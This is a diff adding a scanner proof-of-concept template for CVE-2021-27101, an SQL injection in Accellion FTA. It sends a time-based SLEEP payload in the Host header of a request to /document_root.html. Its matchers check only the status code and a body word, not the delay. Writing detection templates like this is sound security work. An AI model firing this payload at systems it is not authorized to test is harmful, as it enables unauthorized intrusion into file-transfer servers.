@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过向 /document_root.html 发送包含 SQL 注入 payload 的特制 Host 头部来验证漏洞是否存在"
+id = "POC-AVE-2021-1109"
+name = "Accellion FTA Host Header SQL Injection PoC"
+severity = "critical"
+tags = ["ave-2021-1109"]
+vuln_id = [
+    "CVE-2021-27101",
+    "AVE-2021-1109",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/document_root.html"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "test.com' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["document_root"]
